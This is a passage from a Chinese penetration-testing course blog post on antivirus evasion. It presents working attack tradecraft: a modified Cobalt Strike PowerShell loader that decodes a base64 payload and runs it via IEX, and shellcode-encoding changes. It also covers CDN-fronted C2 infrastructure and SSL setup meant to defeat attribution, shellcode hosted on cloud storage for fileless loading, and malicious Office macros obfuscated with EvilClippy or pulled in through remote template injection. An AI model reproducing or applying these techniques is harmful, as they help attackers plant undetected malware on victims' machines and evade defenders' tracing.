文件，实现生成的文件即免杀。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">x1=<span class="string">&#x27;&#x27;</span>;<span class="variable">$x2</span>=<span class="string">&#x27;%%DATA%%&#x27;</span>;<span class="variable">$x3</span>=<span class="string">&#x27;&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">xx1=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class="variable">$x1</span>))</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">xx2=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class="variable">$x2</span>))</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">xx3=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class="variable">$x3</span>))</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">xxx=<span class="variable">$xx1</span>+<span class="variable">$xx2</span>+<span class="variable">$xx3</span></span></span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">  start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $xxx | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">  IEX $xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>改变生成 C shellcode 的逻辑 直接 base 64 编码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] toC(byte[] var0) &#123;</span><br><span class="line">  Packer var1 = new Packer();</span><br><span class="line">  var1.addString(&quot;/* length: &quot; + var0.length + &quot; bytes */\n&quot;);</span><br><span class="line">  var1.addString(&quot;unsigned char buf[] = \&quot;&quot; + CommonUtils.bString(toVeil(var0)) + &quot;\&quot;;\n&quot;);</span><br><span class="line">  return var1.getBytes();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="防朔源"><a class="markdownIt-Anchor" href="#防朔源">#</a> 防朔源</h4>
<ul>
<li>CDN 节点防拉黑 ip</li>
</ul>
<p>域名注册商：<span class="exturl" data-url="aHR0cHM6Ly9zZy5nb2RhZGR5LmNvbS8=">https://sg.godaddy.com/</span><br>
cdn 解析商：<span class="exturl" data-url="aHR0cHM6Ly9kYXNoLmNsb3VkZmxhcmUuY29tLw==">https://dash.cloudflare.com/</span><br>
c2 模板：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdGV4cHJlc3MvbWFsbGVhYmxlLWMy">https://github.com/threatexpress/malleable-c2</span></p>
<p>（ 1 ）前期准备</p>
<p>申请 godaddy 域名、配置 cloudflare、添加解析记录，指向 CS 的 IP、配置 DNS 服务器，使用 cloudflare、下载 C2 文件模版，修改配置并上传、启动 CS 加载 CS 模版，使用 stag 生成</p>
<p>（ 2 ）因为 cloudflare 的原因这里端口的设置需要注意以下：</p>
<p>若是 http，则只能设置 80,8080,8880,2052,2082,2086,2095 这些端口号<br>
若是 https，则只能设置 443,2053,2083,2087,2096,8443 这些端口号</p>
<p>（ 3 ）cs 后门生成使用 Stageless 模式</p>
<p>依次生成后门，如果对方进行朔源，拉黑的 ip 将会是域名解析的 cdn ip</p>
<ul>
<li>修改 cs 的 SSL 证书</li>
</ul>
<p>（ 1 ）配置 SSL 设置</p>
<p>创建证书（SSL - 源服务器）、设置页面规则 (缓存级别 - 绕过)、保存 CSR &amp; 密匙 (server.pem&amp;server.key)</p>
<p>（ 2 ）生成证书文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in server.pem -inkey server.key -out [http://www.yaosese.](http://www.yaosese.) xyz.p12 -name [http://www.yaosese.xyz](http://www.yaosese.xyz) -passout pass:123456</span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkey store [http://www.yaosese.xyz.store](http://www.yaosese.xyz.store) -srckeystore [http://www.yaosese.xyz.p12](http://www.yaosese.xyz.p12) -srcstoretype PK CS12 -srcstorepass 123456 -alias [http://www.yaosese.xyz](http://www.yaosese.xyz)</span><br></pre></td></tr></table></figure>
<p>（ 3 ）修改 teamserver</p>
<p>证书指向：www.yaosese.xyz.store<br>
 证书密码： 123456</p>
<p>（ 4 ）启动 teamserver</p>
<p>./teamserver ip pass jquery-c2.4.5.profile</p>
<ul>
<li>OSS 存储 shellcode</li>
</ul>
<p>将 shellcode 编码后存储在 oss 上，是安全的标志，可以进行免杀的无文件落地。云上开启 OSS 对象存储、创建 Bucket 列表、设置 Bucket 属性、上传 Shellcode 文件、获取地址 &amp; 代码加载</p>
<h4 id="office套件宏病毒"><a class="markdownIt-Anchor" href="#office套件宏病毒">#</a> office 套件宏病毒</h4>
<ul>
<li>本地宏引用</li>
</ul>
<p>通过 cs 生成宏代码，打开 office 的选项，增加开发工具，新增宏为上线代码。存储为 97 - 23.doc 或者 docm、并且在首次打开 word 时启用宏可以上线。但是此宏会被杀毒软件自动清除，所以需要进行免杀，否则无法上线。</p>
<ul>
<li>本地宏引用 工具混淆</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/outflanknl/EvilClippy</span></span><br><span class="line">EvilClippy -s 1.vba xd.doc</span><br><span class="line">Sub Hello()</span><br><span class="line">Dim X</span><br><span class="line">X=MsgBox(&quot;Hello VBS&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>本地宏引用 混淆 VBA</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VBA代码助手 macro_pack</span></span><br><span class="line">BadAssMacrosx-i payload.bin -w doc -p no -s classic -c 5 -o 1.vba</span><br><span class="line">https://github.com/lgzcarson/Payloads/blob/3066615cde55f9cd6755ed81a7d83c229f78e397/Methodology%20and%20Resources/Office%20-%20Attacks.md</span><br></pre></td></tr></table></figure>
<ul>
<li>远程宏引用</li>
</ul>
<p>将 docm 宏存储在远程 oss 或者 github 上，用带模板的 docx 通过修改 settings.xml 来指向远程宏木马所在的位置。<br>
（ 1 ）制作包含宏的恶意模版文件（.docm），注意用 EvilClippy 做一层免杀。<br>
（ 2 ）将恶意模版文件上传至服务器。如 Github、OSS 等公共文件平台。<br>
（ 3 ）新建并保存一个使用任意模版的 docx 文件。改 docx 后缀为 zip，解压 docx 文件，修改 word_rels\settings.xml.rels 文件的 Target 属性，将其指向部署恶意模版文件的服务器。<br>
（ 4 ）使用 zip 格式压缩文件，并重新命名后缀为 docx。<br>
（ 5 ）重新打开 docx 文件，并启用宏。</p>

      <div class="tags">
          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">更新于</span>
    <time title="修改时间：2023-07-04 23:15:08" itemprop="dateModified" datetime="2023-07-04T23:15:08+08:00">2023-07-04</time>
  </span>
  <span id="2022/12/30/SAFE/10 免杀对抗/" class="item leancloud_visitors" data-flag-title="XD22 10 免杀对抗" title="阅读次数">
      <span class="icon">
        <i class="ic i-eye"></i>
      </span>
      <span class="text">阅读次数</span>
      <span class="leancloud-visitors-count"></span>
      <span class="text">次</span>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> 赞赏</button>
  <p>请我喝[茶]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
        <p>微信支付</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
        <p>支付宝</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
        <p>贝宝</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
  </li>
  <li class="link">
    <strong>本文链接：</strong>
    <a href="http://www.n1h1l157.live/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" title="XD22 10 免杀对抗">http://www.n1h1l157.live/2022/12/30/SAFE/10 免杀对抗/</a>
  </li>
  <li class="license">
    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;z4cW6UBjvtpaC8R.jpg" title="XD22 4 API 攻防">
  <span class="type">上一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
  <h3>XD22 4 API 攻防</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;iqT6cP9kuwrzyLx.jpg" title="XD22 12 权限维持">
  <span class="type">下一篇</span>
  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
  <h3>XD22 12 权限维持</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="文章目录">
          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%B1%82%E9%9D%A2%E5%85%8D%E6%9D%80"><span class="toc-number">1.</span> <span class="toc-text"> 源码层面免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#c%E5%85%8D%E6%9D%80"><span class="toc-number">1.1.</span> <span class="toc-text"> c 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#py%E5%85%8D%E6%9D%80"><span class="toc-number">1.2.</span> <span class="toc-text"> py 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ps1-%E5%85%8D%E6%9D%80"><span class="toc-number">1.3.</span> <span class="toc-text"> ps1 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ps1-cmd-%E5%85%8D%E6%9D%80"><span class="toc-number">1.4.</span> <span class="toc-text"> ps1 cmd 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c-%E5%85%8D%E6%9D%80"><span class="toc-number">1.5.</span> <span class="toc-text"> C# 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#go-%E5%85%8D%E6%9D%80"><span class="toc-number">1.6.</span> <span class="toc-text"> Go 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asm-%E5%85%8D%E6%9D%80"><span class="toc-number">1.7.</span> <span class="toc-text"> ASM 免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java-%E5%85%8D%E6%9D%80"><span class="toc-number">1.8.</span> <span class="toc-text"> Java 免杀</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0"><span class="toc-number">2.</span> <span class="toc-text"> py 无文件落地</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E6%96%87%E6%9C%AC%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.</span> <span class="toc-text"> 从文本中提取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E5%8F%82%E6%95%B0%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.2.</span> <span class="toc-text"> 从参数中提取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8Ehttp%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text"> 从 http 中提取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8Esocket%E8%8E%B7%E5%8F%96%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.4.</span> <span class="toc-text"> 从 socket 获取木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E5%9B%BE%E7%89%87%E4%B8%AD%E9%9A%90%E5%86%99%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.5.</span> <span class="toc-text"> 从图片中隐写木马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80"><span class="toc-number">3.</span> <span class="toc-text"> 内存加载免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E8%BD%ACuuid"><span class="toc-number">3.1.</span> <span class="toc-text"> ShellCode 转 UUID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E8%BD%ACmac"><span class="toc-number">3.2.</span> <span class="toc-text"> ShellCode 转 MAC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E8%BD%ACipv4"><span class="toc-number">3.3.</span> <span class="toc-text"> ShellCode 转 IPV4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nim-%E5%85%8D%E6%9D%80"><span class="toc-number">4.</span> <span class="toc-text"> Nim 免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%B0%81%E8%A3%85%E6%9C%A8%E9%A9%AC"><span class="toc-number">4.1.</span> <span class="toc-text"> 工具封装木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E5%85%8D%E6%9D%80"><span class="toc-number">4.2.</span> <span class="toc-text"> 无文件落地免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shellcode%E8%BD%ACuuid-2"><span class="toc-number">4.3.</span> <span class="toc-text"> shellcode 转 uuid</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E9%9D%A2%E5%85%8D%E6%9D%80"><span class="toc-number">5.</span> <span class="toc-text"> 应用层面免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9F%A5%E6%9D%80%E6%96%B9%E5%BC%8F%E7%90%86%E8%AE%BA%E7%82%B9"><span class="toc-number">5.1.</span> <span class="toc-text"> 常见查杀方式理论点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E5%BE%81%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8E%E5%8A%A0%E5%A3%B3"><span class="toc-number">5.2.</span> <span class="toc-text"> 特征码花指令与加壳</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dll%E5%8A%AB%E6%8C%81"><span class="toc-number">5.3.</span> <span class="toc-text"> dll 劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E5%9B%9E%E8%B0%83%E4%B8%8Ehook"><span class="toc-number">5.4.</span> <span class="toc-text"> sys 回调与 hook</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF"><span class="toc-number">6.</span> <span class="toc-text"> 其他免杀技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text"> 反调试与反虚拟化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91cs"><span class="toc-number">6.2.</span> <span class="toc-text"> 二次开发 CS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%9C%94%E6%BA%90"><span class="toc-number">6.3.</span> <span class="toc-text"> 防朔源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#office%E5%A5%97%E4%BB%B6%E5%AE%8F%E7%97%85%E6%AF%92"><span class="toc-number">6.4.</span> <span class="toc-text"> office 套件宏病毒</span></a></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="系列文章">
        <ul>
          <li><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li><a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li class="active"><a href="/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li><a href="/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li><a href="/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li><li><a href="/2023/05/01/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/10/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="站点概览">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt=".N1h1l157"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">.N1h1l157</p>
  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">165</span>
        <span class="name">文章</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">5</span>
        <span class="name">分类</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">39</span>
        <span class="name">标签</span>
      </a>
    </div>
</nav>

<div class="social">
      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
  </li>

    
  <li class="item">
    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
  </li>

        
  <li class="item">
    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
  </li>

        
  <li class="item">
    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
  </li>

  </ul>
    
  <li class="item">
    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
  </li>

        
  <li class="item dropdown">
      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
    <ul class="submenu">

        
  <li class="item">
    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
  </li>

        
  <li class="item">
    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
  </li>

        
  <li class="item">
    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
  </li>

  </ul>

</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/26%E3%80%8A%E4%BA%BA%E7%B1%BB%E7%AE%80%E5%8F%B2%E3%80%8B%E5%B0%A4%E7%93%A6%E5%B0%94%C2%B7%E8%B5%AB%E6%8B%89%E5%88%A9/" title="《人类简史》尤瓦尔·赫拉利">《人类简史》尤瓦尔·赫拉利</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/118%20JANGOW/" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/6%E3%80%8A%E8%AE%BA%E4%B8%8A%E5%B8%9D%E7%9A%84%E9%9A%90%E7%A7%98%E3%80%8B%E5%BA%93%E6%92%92%C2%B7%E5%B0%BC%E5%8F%A4%E6%8B%89/" title="《论上帝的隐秘》库撒·尼古拉">《论上帝的隐秘》库撒·尼古拉</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/61%E3%80%8A%E6%AD%BB%E4%BA%A1%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6%E3%80%8B%E4%B8%B9%E5%B0%BC%E6%B4%9B%C2%B7%E5%A5%91%E6%96%AF/" title="《死亡百科全书》丹尼洛·契斯">《死亡百科全书》丹尼洛·契斯</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
</div>

    <span><a href="/2021/11/01/VULNHUB/110%20RED/" title="VULNHUB 10 RED">VULNHUB 10 RED</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2019/07/01/BOOK/2%E3%80%8A%E5%B0%91%E6%9C%89%E4%BA%BA%E8%B5%B0%E7%9A%84%E8%B7%AF%E3%80%8B%E6%96%AF%E7%A7%91%E7%89%B9%C2%B7%E6%B4%BE%E5%85%8B/" title="《少有人走的路》斯科特·派克">《少有人走的路》斯科特·派克</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
</div>

    <span><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2019 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="站点总字数">747k 字</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="站点阅读时长">20:45</span>
  </div>

<!--   自定义开启一个网站的运行时间 -->
  <div class="site-uptime">
    Site uptime: <span id="site-uptime"></span>
  </div>
  <script>
    var siteUptimeElement = document.getElementById('site-uptime');
